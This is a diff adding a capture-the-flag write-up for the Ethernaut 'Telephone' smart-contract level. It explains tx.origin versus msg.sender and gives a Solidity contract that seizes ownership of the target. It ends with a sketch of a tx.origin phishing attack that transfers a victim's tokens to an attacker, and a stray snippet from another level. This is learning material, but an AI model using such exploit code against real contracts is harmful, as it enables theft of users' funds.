@@ -1,0 +1,69 @@
+Telephone
+Difficulty 1/10
+
+Claim ownership of the contract below to complete this level.
+
+  Things that might help
+
+See the Help page above, section "Beyond the console"
+
+tx.origin
+
+https://swcregistry.io/docs/SWC-115#:~:text=Description-,tx.,calls%20into%20a%20malicious%20contract.
+
+https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
+
+https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/3d3147d9-f79f-4a0e-8c9f-befee5897083.xhtml
+
+220308 20:13 I am so happy to be back in this CTF games.
+The whole point of this level is to ask whether a hacker understands the differences between 
+tx.origin and msg.sender.
+
+tx.origin is the sender of transaction. unlike msg.sender, it traces waay back to the initial
+external account. 
+
+So to solve this quiz, just need to make a smart contract that calls function in Telephone.
+when A is an EOA, B is a smart contrat that manipulates C, C is the target contract.
+A -> B -> C
+For C
+A is tx.origin and B is msg.sender
+
+I will just use low-level call function to call changeOwner() function.
+
+(bool success, ) = target.call(abi.encodeWithSignature("flip(bool)", true));
+require(success, "tx failed");
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract changeOwner {
+    address target = 0xC283232980fa6f0aD947b0875D6fb98Cf6e9fd13;
+    function change() external {
+        (bool success, ) = target.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
+        require(success, "tx failed");
+    }
+}
+
+
+Telephone
+Level completed!
+Difficulty 1/10
+
+While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.
+this:
+https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/
+
+An example of a possible attack is outlined below.
+
+Use tx.origin to determine whose tokens to transfer, e.g.
+function transfer(address _to, uint _value) {
+  tokens[tx.origin] -= _value;
+  tokens[_to] += _value;
+}
+Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
+function () payable {
+  token.transfer(attackerAddress, 10000);
+}
+In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
+
